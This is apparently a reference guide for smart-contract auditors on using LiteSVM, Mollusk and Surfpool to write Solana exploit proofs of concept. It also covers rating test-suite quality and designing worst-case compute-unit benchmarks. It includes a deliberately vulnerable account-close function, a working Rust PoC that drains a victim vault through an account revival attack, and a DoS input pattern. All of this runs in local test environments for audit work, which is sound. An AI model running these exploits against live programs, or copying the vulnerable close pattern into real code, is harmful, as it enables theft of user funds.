---
id: RES-SOLANA-TESTING-AUDITORS
title: Solana Testing Frameworks for Auditors
category: resource
parent: SCANNER-SOLANA
chains: [solana]
languages: [rust, typescript]
frameworks: [litesvm, mollusk, surfpool]
last_updated: 2026-02-25
description: >-
  Use when writing exploit PoCs for Solana audit findings — covers LiteSVM
  (Rust + TypeScript), Mollusk for CU benchmarking, Surfpool for mainnet
  state testing, revival attack PoC example, and CI integration.
---

# Solana Testing Frameworks for Auditors

This resource covers how to **prove vulnerabilities**, not how to develop programs. Each framework serves a distinct role in an auditor's workflow:

| Framework | Best For | Language |
|-----------|----------|----------|
| **LiteSVM** | Exploit PoCs — fast, full control over state | Rust, TypeScript, Python |
| **Mollusk** | CU impact analysis — precise instruction-level metrics | Rust only |
| **Surfpool** | Mainnet state replay — testing against real accounts/programs | TypeScript (RPC) |

## 1. LiteSVM — Exploit PoC Framework

LiteSVM runs a Solana VM directly in your test process with no validator overhead. You get full control over accounts, clock, compute budget, and signature verification — everything needed to prove an exploit works.

### Rust Setup

```bash
cargo add --dev litesvm solana-sdk
```

```rust
use litesvm::LiteSVM;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, transaction::Transaction};

#[test]
fn test_exploit() {
    let mut svm = LiteSVM::new();

    // Load vulnerable program
    let program_id = pubkey!("VulnerableProgram1111111111111111111111111");
    svm.add_program_from_file(program_id, "target/deploy/program.so");

    // Fund attacker
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 5_000_000_000).unwrap();

    // Build exploit transaction
    let tx = Transaction::new_signed_with_payer(
        &[/* exploit instructions */],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "Exploit should succeed on vulnerable program");
}
```

### TypeScript Setup

```bash
npm i --save-dev litesvm @solana/web3.js
```

```typescript
import { LiteSVM } from "litesvm";
import { PublicKey, Transaction, Keypair } from "@solana/web3.js";

const svm = new LiteSVM();
const programId = new PublicKey("VulnerableProgram1111111111111111111111111");
svm.addProgramFromFile(programId, "target/deploy/program.so");

const attacker = Keypair.generate();
svm.airdrop(attacker.publicKey, 5_000_000_000n);

const tx = new Transaction();
tx.recentBlockhash = svm.latestBlockhash();
tx.add(/* exploit instructions */);
tx.sign(attacker);

const result = svm.sendTransaction(tx);
```

### Key LiteSVM Features for Auditors

```rust
// Manipulate clock — test time-dependent vulnerabilities
svm.set_sysvar(&Clock { slot: 1000, unix_timestamp: 1700000000, .. });
svm.warp_to_slot(5000);

// Raise compute budget — test CU exhaustion DoS
svm.set_compute_budget(ComputeBudget { max_units: 1_400_000, .. });

// Disable sig verification — test with forged signers
svm.with_sigverify(false);

// Check CU consumption on exploit tx
let result = svm.send_transaction(tx)?;
println!("Exploit consumed {} CUs", result.compute_units_consumed);
```

## 2. Mollusk — Compute Unit Impact Analysis

Mollusk provides direct instruction-level program execution without a validator runtime. Use it when you need to **quantify the CU cost** of a vulnerability (e.g., proving a DoS vector exhausts the budget).

### Setup

```bash
cargo add --dev mollusk-svm mollusk-svm-programs-token solana-sdk
```

### Measuring Vulnerability CU Impact

```rust
use mollusk_svm::Mollusk;
use mollusk_svm::result::Check;
use solana_sdk::{account::Account, pubkey::Pubkey, instruction::Instruction};

#[test]
fn test_cu_exhaustion_dos() {
    let program_id = Pubkey::new_unique();
    let mollusk = Mollusk::new(&program_id, "target/deploy/program");

    // Set maximum CU budget
    mollusk.set_compute_budget(1_400_000);

    // Craft instruction with attacker-controlled loop bound
    let malicious_data = vec![0xFF; 256]; // triggers unbounded iteration
    let instruction = Instruction {
        program_id,
        accounts: vec![/* metas */],
        data: malicious_data,
    };
    let accounts = vec![/* (pubkey, account) tuples */];

    // Prove it exceeds budget
    mollusk.process_and_validate_instruction(
        &instruction,
        &accounts,
        &[Check::err(/* ProgramFailedToComplete */)],
    );
}
```

### CU Benchmarking for Audit Reports

```rust
use mollusk_svm::MolluskComputeUnitBencher;

// Compare CU usage: normal vs malicious input
let bencher = MolluskComputeUnitBencher::new(mollusk)
    .must_pass(true)
    .out_dir("../target/benches");

bencher.bench("normal_deposit",   &normal_ix,    &normal_accounts);
bencher.bench("malicious_deposit", &malicious_ix, &attacker_accounts);
// Generates markdown report — attach to audit finding
```

### Token Program Helpers

```rust
use mollusk_svm_programs_token::token;

token::add_program(&mut mollusk);
let mint = token::mint_account(6, 1_000_000_000, mint_authority);
let victim_ata = token::token_account(mint_pubkey, victim, 500_000);
let attacker_ata = token::token_account(mint_pubkey, attacker, 0);
```

### Advanced Configuration

```rust
// Time-sensitive vulnerabilities
mollusk.sysvars.clock = Clock {
    slot: 1000, epoch: 5, unix_timestamp: 1700000000,
    ..Default::default()
};

// Enable all feature flags (match mainnet behavior)
mollusk.set_feature_set(FeatureSet::all_enabled());
```

## 3. Surfpool — Mainnet State Replay

Surfpool (via its local network component Surfnet) clones mainnet accounts and programs into a local environment. Use it when your exploit depends on **real protocol state** — e.g., testing against actual Jupiter routes, Raydium pools, or live oracle values.

### Setup

```bash
cargo install surfpool
surfpool start            # starts local Surfnet on port 8899
```

```typescript
import { Connection } from "@solana/web3.js";
const connection = new Connection("http://localhost:8899", "confirmed");
```

### Clone Real Accounts for Exploit Testing

```typescript
// Clone a live account to local Surfnet
await connection._rpcRequest("surfnet_setAccount", [{
    pubkey: victimVault.toString(),
    lamports: 50_000_000_000,                         // 50 SOL
    data: Buffer.from(realAccountData).toString("base64"),
    owner: vulnerableProgramId.toString(),
}]);

// Clone a token account with specific balance
await connection._rpcRequest("surfnet_setTokenAccount", [{
    pubkey: victimTokenAccount.toString(),
    mint: usdcMint.toString(),
    owner: victimWallet.toString(),
    amount: "10000000000",                             // 10,000 USDC
}]);

// Clone a program from mainnet
await connection._rpcRequest("surfnet_cloneProgramAccount", [{
    source: mainnetProgramId.toString(),
    destination: localProgramId.toString(),
    account: programDataAccount.toString(),
}]);
```

### Time Travel and Block Manipulation

```typescript
// Jump to a specific slot (reproduce historical state)
await connection._rpcRequest("surfnet_timeTravel", [{
    absoluteSlot: 250_000_000,
}]);

// Pause block production (freeze state for multi-step exploit)
await connection._rpcRequest("surfnet_pauseClock", []);
// ... execute exploit steps ...
await connection._rpcRequest("surfnet_resumeClock", []);
```

### Economic Edge Case Testing

```typescript
// Manipulate SOL supply to test economic assumptions
await connection._rpcRequest("surfnet_setSupply", [{
    circulating: "500000000000000000",
    nonCirculating: "100000000000000000",
    total: "600000000000000000",
}]);
```

## 4. Example: Account Revival Attack PoC

This demonstrates proving a **closing account revival** vulnerability — where a closed account's stale data is read by a subsequent instruction in the same transaction. See [pinocchio-security.md](pinocchio-security.md) §3 for the vulnerability details.

### The Vulnerability

```rust
// VULNERABLE close function — missing discriminator poison + realloc
fn close_vault(vault: &AccountInfo, destination: &AccountInfo) -> ProgramResult {
    **destination.try_borrow_mut_lamports()? += **vault.try_borrow_lamports()?;
    **vault.try_borrow_mut_lamports()? = 0;
    // BUG: data not zeroed, account not properly closed
    // A later instruction in the same tx can still read vault.data
    Ok(())
}
```

### The PoC (LiteSVM / Rust)

```rust
use litesvm::LiteSVM;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey, signature::Keypair, transaction::Transaction,
};

#[test]
fn prove_revival_attack() {
    let mut svm = LiteSVM::new();
    let program_id = pubkey!("VulnerableProgram1111111111111111111111111");
    svm.add_program_from_file(program_id, "target/deploy/program.so");

    let attacker = Keypair::new();
    let victim = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();

    // Step 1: victim creates and funds a vault
    let vault_pda = Pubkey::find_program_address(
        &[b"vault", victim.pubkey().as_ref()], &program_id
    ).0;

    let init_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(victim.pubkey(), true),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(solana_sdk::system_program::ID, false),
        ],
        data: vec![0], // init discriminator
    };

    let init_tx = Transaction::new_signed_with_payer(
        &[init_ix], Some(&victim.pubkey()), &[&victim], svm.latest_blockhash(),
    );
    svm.send_transaction(init_tx).unwrap();

    // Verify vault has funds
    let vault_before = svm.get_account(&vault_pda).unwrap();
    assert!(vault_before.lamports > 0, "Vault should be funded");

    // Step 2: attacker's multi-instruction exploit transaction
    // ix1: close the vault (lamports go to attacker)
    let close_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(attacker.pubkey(), true),  // destination
            AccountMeta::new(vault_pda, false),
        ],
        data: vec![2], // close discriminator
    };

    // ix2: read stale vault data — the revival
    // Because close didn't zero data or poison discriminator,
    // this instruction sees the vault as still valid
    let read_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(attacker.pubkey(), true),
            AccountMeta::new(vault_pda, false),
        ],
        data: vec![3], // withdraw discriminator — reads stale authority
    };

    // Both instructions in ONE transaction — the attack
    let exploit_tx = Transaction::new_signed_with_payer(
        &[close_ix, read_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(exploit_tx);
    assert!(result.is_ok(), "Revival attack should succeed — vulnerability confirmed");

    // Verify attacker profited
    let attacker_after = svm.get_account(&attacker.pubkey()).unwrap();
    assert!(attacker_after.lamports > 10_000_000_000, "Attacker should have gained funds");
}
```

### What This Proves

| Step | What happens | Why it works |
|------|-------------|---------------|
| `close_ix` | Vault lamports → attacker, but data remains | Missing `data[0] = 0xFF` poison |
| `read_ix` | Program reads vault, sees valid discriminator + authority | Data not zeroed within same tx |
| Both in one tx | Solana runtime caches account state across instructions | Stale-read window exists until tx completes |

### Fix Verification

After the protocol applies the fix (poison discriminator + realloc + close), rerun the same PoC:

```rust
let result = svm.send_transaction(exploit_tx);
assert!(result.is_err(), "Revival attack should fail after fix");
```

## 5. CI Integration for Security Tests

### GitHub Actions — Security Test Pipeline

```yaml
name: Security Tests
on: [push, pull_request]

jobs:
  unit-security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rust-lang/setup-rust-toolchain@v1
      - name: Build program
        run: cargo build-sbf
      - name: Run security PoCs
        run: cargo test-sbf --test security_pocs -- --nocapture

  cu-benchmarks:
    runs-on: ubuntu-latest
    needs: unit-security-tests
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rust-lang/setup-rust-toolchain@v1
      - name: Run CU benchmarks
        run: cargo test-sbf --test cu_benchmarks
      - name: Upload CU report
        uses: actions/upload-artifact@v4
        with:
          name: cu-benchmarks
          path: target/benches/*.md

  mainnet-integration:
    runs-on: ubuntu-latest
    needs: unit-security-tests
    steps:
      - uses: actions/checkout@v4
      - name: Install Surfpool
        run: cargo install surfpool
      - name: Start Surfnet
        run: surfpool start --background
      - name: Run mainnet-state tests
        run: cargo test --test integration -- --nocapture
```

### Test Directory Layout for Audits

```
tests/
├── security_pocs/          # LiteSVM — exploit PoCs
│   ├── revival_attack.rs
│   ├── missing_signer.rs
│   ├── arbitrary_cpi.rs
│   └── mod.rs
├── cu_benchmarks/          # Mollusk — CU impact proofs
│   ├── dos_vectors.rs
│   └── mod.rs
├── integration/            # Surfpool — mainnet state tests
│   ├── real_state_exploit.rs
│   └── mod.rs
└── fixtures/
    └── accounts.rs         # Shared: attacker/victim keypairs, PDAs
```

### PoC Naming Convention

Name tests to match audit findings for traceability:

```rust
#[test]
fn h01_missing_signer_check_on_withdraw() { /* ... */ }

#[test]
fn h02_arbitrary_cpi_in_swap_handler() { /* ... */ }

#[test]
fn m01_cu_exhaustion_via_unbounded_loop() { /* ... */ }
```

## Framework Selection Guide

| Scenario | Use | Why |
|----------|-----|-----|
| Prove missing signer/owner check | **LiteSVM** | Fast, full tx control, multi-instruction |
| Prove CU exhaustion DoS | **Mollusk** | Precise CU measurement, benchmarking reports |
| Prove CPI exploit against real DEX | **Surfpool** | Clone mainnet programs + accounts |
| Prove time-dependent vulnerability | **LiteSVM** | `warp_to_slot` / `set_sysvar` for clock |
| Prove revival/reentrancy attack | **LiteSVM** | Multi-instruction tx in one test |
| Quantify fix effectiveness | **Mollusk** | Before/after CU comparison |
| Reproduce mainnet incident | **Surfpool** | Clone exact state at incident slot |

## 6. Evaluating Test Quality — Is This Test Actually Testing Anything?

Protocols ship with test suites. Auditors inherit them. Before trusting a
test suite, evaluate whether the tests actually exercise meaningful behavior
or just create an illusion of coverage.

This 6-point framework works for **any** security test — unit tests,
integration tests, fuzz tests, PoCs, and formal proofs.

### The 6-Point Analysis

#### Point 1: Input Classification

What kind of inputs does the test use?

| Input Type | Strength | Example |
|-----------|----------|---------|
| **Symbolic** (`kani::any()`) | Highest — exercises all values | Formal verification only |
| **Randomized** (proptest, fuzz) | High — wide coverage | `proptest!(|(amount in 0..u64::MAX)| { ... })` |
| **Edge-case set** | Medium — targets boundaries | `[0, 1, u64::MAX - 1, u64::MAX]` |
| **Single concrete** | Low — proves one path | `let amount = 1000;` |
| **Copy-paste defaults** | None — proves nothing specific | `let amount = 100;` in every test |

**Red flag:** If every test in the suite uses the same concrete values
(e.g., depositing 1000 tokens, withdrawing 500), the tests only prove
those exact amounts work. Edge cases like 0, 1, `u64::MAX`, or amounts
that cause rounding are never exercised.

#### Point 2: Branch Coverage

Does the test exercise both sides of each conditional?

```rust
// The function under test:
fn withdraw(amount: u64, balance: u64) -> Result<()> {
    if amount > balance { return Err(InsufficientFunds); }  // branch A
    if amount == 0 { return Err(ZeroAmount); }               // branch B
    // ... transfer logic                                     // branch C
    Ok(())
}
```

| Test | Branches Hit | Quality |
|------|-------------|---------|
| `withdraw(500, 1000)` | C only | Poor — never tests rejection |
| `withdraw(500, 1000)` + `withdraw(2000, 1000)` | A + C | Better — tests one rejection |
| Above + `withdraw(0, 1000)` | A + B + C | Good — all branches |

**Red flag:** Tests only exercise the happy path. No test ever expects `Err`.

#### Point 3: Assertion Strength

What does the test actually check?

| Assertion Pattern | Strength | What It Proves |
|------------------|----------|----------------|
| `assert!(result.is_ok())` | Weak | Transaction didn't fail — but did it do the right thing? |
| `assert!(result.is_err())` | Medium | Transaction rejected — but for the right reason? |
| `assert_eq!(result.unwrap_err(), InsufficientFunds)` | Strong | Rejected with exact expected error |
| `assert_eq!(vault_after, vault_before - amount)` | Strong | State changed correctly |
| No assertion (just runs) | None | Proves the program doesn't panic. That's it. |

**Red flag:** Tests use `assert!(result.is_ok())` without checking any
resulting state. The transaction "succeeded" but you don't know if the
right amount was transferred, the right accounts were modified, or the
right events were emitted.

#### Point 4: Vacuity Risk

Can the test pass without exercising the code you think it does?

```rust
// VACUOUS: This test "proves" the admin check works
#[test]
fn test_admin_only() {
    let admin = Keypair::new();
    let result = call_admin_instruction(&admin);  // admin IS the signer
    assert!(result.is_ok());
    // But... this only proves admin CAN call it.
    // It never proves non-admin CANNOT call it!
}
```

```rust
// NON-VACUOUS: Tests both sides
#[test]
fn test_admin_only() {
    let admin = Keypair::new();
    let attacker = Keypair::new();

    let ok = call_admin_instruction(&admin);
    assert!(ok.is_ok(), "admin should succeed");

    let err = call_admin_instruction(&attacker);
    assert!(err.is_err(), "non-admin should fail");
    assert_eq!(err.unwrap_err(), Unauthorized);
}
```

**Red flag:** Authorization tests only test the allowed case, never the
rejected case. A test that proves "admin can call X" says nothing about
whether a random user can also call X.

#### Point 5: Boundary Collapse

Test inputs avoid the ranges where bugs actually live.

| Dangerous Range | Why | What Tests Miss |
|----------------|-----|----------------|
| `amount = 0` | Division by zero, no-op transfers | Zero-amount deposits/withdrawals passing silently |
| `amount = 1` | Rounding to zero in fee calculations | Fee calculation returning 0, skipping fee |
| `amount = u64::MAX` | Overflow in `amount + fee` | Wrapping arithmetic in release builds |
| `balance == amount` | Exact-balance edge | Off-by-one leaving 1 lamport dust |
| `price = 0` | Oracle returning zero | Division by zero in value calculations |
| `timestamp = 0` or `MAX` | Time boundaries | Expired-but-accepted, or wrapped time comparisons |
| `accounts[i] == accounts[j]` | Same account for 2 params | Duplicate account injection |

**Red flag:** Test amounts are always "nice" numbers (100, 1000, 1_000_000)
that never trigger rounding, overflow, or boundary conditions.

#### Point 6: Coupling Completeness

Does the test exercise the real production path?

| Pattern | Problem |
|---------|---------|
| Test calls a helper, not the instruction | Helper may have different validation |
| Test builds custom `AccountInfo`s | May bypass framework-level checks (Anchor constraints) |
| Test uses mocked oracle | Real oracle has staleness/confidence filtering |
| Test skips CPI | CPI target validation and return data parsing untested |
| Test uses different program binary | Debug vs release mode (overflow behavior differs!) |

**Red flag:** Tests pass when run with `cargo test` but the program is
deployed as BPF. BPF and native execution differ in overflow behavior,
compute limits, and account validation. Always verify critical tests run
with `cargo test-sbf` or LiteSVM with the actual BPF binary.

### Test Quality Classification

After applying the 6 points, classify each test:

| Classification | Criteria | Value |
|---------------|----------|-------|
| **STRONG** | Exercises both valid/invalid inputs, checks specific errors/state, covers branches | High — genuine security assurance |
| **WEAK** | Tests happy path only, or uses weak assertions, or avoids edge cases | Low — false confidence |
| **THEATRICAL** | Many tests with copy-paste values and `is_ok()` assertions | None — illusion of coverage |
| **NEGATIVE-ONLY** | Only tests that bad inputs fail, never that good inputs succeed correctly | Medium — half the picture |
| **VACUOUS** | Test passes regardless of the code's behavior | None — proves nothing |

### Quick Assessment Checklist

When reviewing a protocol's existing test suite:

```
┌─────────────────────────────────────────────────────┐
│  TEST SUITE QUALITY QUICK EVAL                      │
│                                                     │
│  1. Do tests pass?           □ Yes  □ No            │
│  2. Auth tests reject bad callers?  □ Yes  □ No     │
│  3. Math tests use edge values?     □ Yes  □ No     │
│  4. CPI tests validate return data? □ Yes  □ No     │
│  5. Tests check state AFTER call?   □ Yes  □ No     │
│  6. Tests use BPF binary?           □ Yes  □ No     │
│  7. Any fuzz/proptest coverage?     □ Yes  □ No     │
│  8. Any formal verification?        □ Yes  □ No     │
│                                                     │
│  SCORING:                                           │
│  8/8 = Mature    5-7 = Developing                   │
│  3-4 = Immature  0-2 = Theatrical                   │
│                                                     │
│  If formal verification present:                    │
│  → See formal-verification-for-auditors.md          │
└─────────────────────────────────────────────────────┘
```

### Anti-Patterns in Test Suites

| Anti-Pattern | What It Looks Like | What Auditors Should Do |
|-------------|-------------------|------------------------|
| **The Happy Path Suite** | Every test deposits, trades, withdraws with nice numbers. No test expects `Err`. | Flag: "Test suite has zero negative test cases. Authorization and input validation are untested." |
| **The Copy-Paste Suite** | 50 tests all using `amount = 1_000_000` | Flag: "Test suite uses identical concrete amounts across all tests. Boundary conditions (0, 1, MAX) are not exercised." |
| **The is_ok() Suite** | `assert!(result.is_ok())` everywhere, no state checking | Flag: "Tests verify transactions succeed but never verify resulting state is correct." |
| **The Debug-Only Suite** | Tests run with `cargo test`, not `cargo test-sbf` | Flag: "Security tests run in native mode. Overflow behavior differs between native (panic) and BPF (wrap)." |
| **The Missing Column** | Auth tests only check that the owner CAN act, never that an attacker CANNOT | Flag: "Authorization tests only verify positive case. No test verifies that unauthorized callers are rejected." |
| **The Theater Suite** | 200+ tests, but count of `assert_eq!` checking error codes or state is < 10 | Flag: "Test count is high but assertion density is low. Most tests prove the program doesn't panic, not that it behaves correctly." |

### Writing Assessment into Audit Reports

For each test evaluation, use this language:

**Mature suite:**
> The test suite contains N tests covering authorization (positive and
> negative), boundary arithmetic, CPI validation, and state transitions.
> Tests run against the BPF binary via LiteSVM. Fuzz coverage exists for
> math-critical functions.

**Developing suite:**
> The test suite covers core happy-path scenarios but lacks negative test
> cases for authorization (N/M admin functions have no rejection tests).
> Boundary arithmetic tests are absent. Recommend adding edge-case inputs
> and rejected-caller tests.

**Theatrical suite:**
> The test suite contains N tests but only M verify specific error codes
> or post-transaction state. K% of tests use `is_ok()` as their sole
> assertion. The suite provides low confidence in security properties.
> Recommend rewriting critical tests with state-verification assertions.

## 7. CU Worst-Case Scenario Design

Compute Unit (CU) analysis is a standard part of Solana audits, but measuring
CU on happy paths is insufficient. Real DoS vulnerabilities emerge from
**adversarial worst-case** inputs. This section provides a methodology for
designing escalating CU benchmark scenarios.

### Why Happy-Path CU Benchmarks Miss Bugs

| What's Tested | What's Missed |
|--------------|---------------|
| Crank with 10 users | Crank with 4,096 users (MAX_ACCOUNTS) |
| Healthy accounts | Mass liquidation cascade (50% price crash) |
| Single crank pass | 16 sequential cranks to sweep all accounts |
| No positions | All users with high-leverage positions |
| Normal balances | Dust accounts (1 lamport) that still require processing |

A protocol that passes CU limits with 100 users may exceed 1.4M CU with
1,000 users. The audit must identify the EXACT user count where CU budget
is exhausted.

### The Escalation Framework

Design CU benchmarks as an ascending sequence from best-case to catastrophic:

```
Level 1: 🟢 Baseline       — Empty state (scan overhead only)
Level 2: 🟡 Dust           — MAX_ACCOUNTS with minimal balances, no positions
Level 3: 🟡 Healthy        — All accounts have positions, normal state
Level 4: 📊 Binary search  — Find the exact user count where CU limit is hit
Level 5: 🟠 Mass liquidation — 50% price crash, all accounts underwater
Level 6: 🔴 Knife-edge     — Mixed long/short, 15% price move (worst margin checks)
Level 7: 🔥 ADL cascade    — Half winners, half losers with varied sizes
Level 8: 🔥🔥 Full sweep  — 4,096 accounts across 16 sequential cranks
Level 9: 🔥🔥🔥 True worst — All accounts liquidatable via MTM margin check
```

### For Each Level, Measure and Report

```
┌──────────────────────────────────────────────┐
│  CU BENCHMARK REPORT TEMPLATE                │
│                                              │
│  Scenario: [description]                     │
│  User count: [N]                             │
│  CU consumed: [X] / 1,400,000               │
│  CU per account: [X/N]                       │
│  % of limit: [X/1.4M * 100]%                │
│  Result: ✓ PASS / ❌ EXCEEDS LIMIT           │
│                                              │
│  Worst single crank (multi-crank sweep):     │
│    CU: [worst] / Total: [sum across cranks]  │
│    Liquidations: [N]  ADL/Force-realize: [N] │
└──────────────────────────────────────────────┘
```

### Key Metrics to Track

| Metric | Why It Matters |
|--------|---------------|
| **CU per account** | Reveals per-account overhead — constant factor in O(n) loops |
| **Worst single crank** | The ceiling that determines if the protocol can operate |
| **CU growth rate** | Linear vs superlinear — superlinear means DoS at scale |
| **Liquidation overhead** | CU overhead per liquidation vs. per healthy account |
| **Binary search breakpoint** | Exact user count where CU budget is exhausted |

### Implementation Pattern (LiteSVM)

```rust
// Level 4: Binary search for practical CU limit
let test_sizes = [100, 500, 1000, 1500, 2000, 2500, 3000, 3500, 4000];
let mut last_success_users = 0;

for &num_users in &test_sizes {
    let mut env = TestEnv::new();
    env.init_market();
    // ... create num_users accounts with positions ...

    match env.try_crank() {
        Ok((cu, _logs)) => {
            let cu_per_account = cu / (num_users + 1) as u64;
            println!("{} users: {} CU (~{}/user)", num_users, cu, cu_per_account);
            last_success_users = num_users;
        }
        Err(_) => {
            println!("{} users: EXCEEDS 1.4M CU!", num_users);
            break;
        }
    }
}
println!("Max practical limit: ~{} users", last_success_users);
```

```rust
// Level 8: Multi-crank sweep — find worst single crank across 16 calls
let mut worst_cu: u64 = 0;
for _crank_num in 0..16 {
    match env.try_crank() {
        Ok((cu, _)) => {
            worst_cu = worst_cu.max(cu);
        }
        Err(e) if e.contains("exceeded CUs") => {
            println!("SINGLE CRANK EXCEEDED 1.4M CU!");
            break;
        }
        _ => {}
    }
}
let pct = (worst_cu as f64 / 1_400_000.0) * 100.0;
println!("Worst single crank: {} CU ({:.1}% of limit)", worst_cu, pct);
```

### Audit Reporting Template

When reporting CU findings:

```markdown
### CU-01: Crank exceeds compute budget at [N] users

**Severity:** Medium / High (depending on how achievable N is)

**Description:** The keeper crank instruction exceeds the 1.4M CU
transaction limit when processing [N] or more accounts in a single pass.
With [MAX_ACCOUNTS] slots, the protocol requires [X] sequential crank
transactions to process all accounts, with the worst single crank
consuming [Y] CU ([Z]% of the limit).

**Scenario tested:** [Level description from framework above]
- Users: [N] (with positions / underwater / dust)
- Price move: [X]% crash
- CU consumed: [Y] / 1,400,000

**Impact:** If user count exceeds [N], crank operations fail silently.
Funding/settlement halts, positions cannot be updated, and liquidations
cannot be processed — creating potential insolvency risk.

**Recommendation:** Implement windowed crank processing (process K accounts
per transaction, require multiple transactions for full sweep).
```

### What to Flag in Audits

| Finding | Severity | Condition |
|---------|----------|-----------|
| Crank exceeds CU at production account count | High | MAX_ACCOUNTS reachable |
| Liquidation path adds >5x CU per account | Medium | Worst-case liquidations possible |
| No CU benchmarks in test suite | Informational | Protocol has on-chain loops |
| CU growth is superlinear | High | O(n²) or worse in scan loops |
| Multi-crank sweep not tested | Medium | Protocol uses windowed processing |

## Cross-References

| Resource | Relevance |
|----------|-----------|
| [pinocchio-security.md](pinocchio-security.md) | Revival attack prevention patterns (§3) |
| [anchor-security.md](anchor-security.md) | Anchor constraint vulnerabilities to PoC |
| [solana-patterns.md](solana-patterns.md) | Common vulnerability patterns with code |
| [account-validation.md](account-validation.md) | Missing validation checks to test |
| [formal-verification-for-auditors.md](formal-verification-for-auditors.md) | When the protocol has Kani/formal proofs — evaluation methodology |
| [../../templates/proof-strength-assessment.md](../../templates/proof-strength-assessment.md) | Generic proof grading template (any chain, any tool) |
| [adversarial-test-design.md](adversarial-test-design.md) | Attack-first test taxonomy and conservation invariant methodology |
